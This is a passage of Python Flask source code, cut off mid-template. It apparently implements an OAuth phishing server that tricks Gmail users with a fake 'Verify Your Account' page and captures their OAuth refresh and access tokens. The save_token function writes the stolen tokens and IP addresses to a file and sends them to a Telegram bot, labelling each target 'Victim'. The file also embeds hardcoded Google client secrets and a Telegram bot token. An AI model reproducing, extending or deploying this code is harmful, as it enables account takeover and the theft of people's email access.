from flask import Flask, request, redirect, session, render_template_string, jsonify
import requests
import json
import os
import base64
from datetime import datetime
from urllib.parse import urlencode

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ================================================================
# YOUR GOOGLE OAUTH CREDENTIALS
# ================================================================
CLIENT_ID = "870868575995-luhgcleqlgjb28tckh6tmidfea3vc3dp.apps.googleusercontent.com"
CLIENT_SECRET = "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"
RENDER_URL = os.environ.get("RENDER_URL", "https://gmail-oauth.onrender.com")

# This is YOUR server's callback — not the landing page's callback
OAUTH_REDIRECT_URI = f"{RENDER_URL}/callback"

# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

# ================================================================
# TOKEN STORAGE
# ================================================================
TOKEN_DB = "/tmp/tokens.json"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def save_token(email, refresh_token, access_token, ip):
    db = {}
    if os.path.exists(TOKEN_DB):
        with open(TOKEN_DB) as f:
            db = json.load(f)
    db[email] = {
        "refresh_token": refresh_token,
        "access_token": access_token,
        "ip": ip,
        "timestamp": datetime.now().isoformat(),
        "method": "redirect_proxy"
    }
    with open(TOKEN_DB, "w") as f:
        json.dump(db, f, indent=2)
    msg = f"""[+]___ GMAIL_OAUTH ___[+]\nVictim: {email}\nToken: {refresh_token}\nIP: {ip}"""
    send_telegram(msg)
    print(f"[+] Captured token for {email}")

# ================================================================
# HOME
# ================================================================
@app.route('/')
def home():
    return """
    <html><body>
    <h2>Gmail Access Tool</h2>
    <p><a href='/auth/gmail'>Authorize Gmail Access</a></p>
    </body></html>
    """

# ================================================================
# PROXY AUTH — Step 1: Redirect to REAL Google OAuth
# ================================================================
@app.route('/auth/gmail')
def auth_gmail():
    """Landing page, then redirect to Google OAuth through us"""
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verify Your Account</title>
        <style>
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:#f0f2f5;display
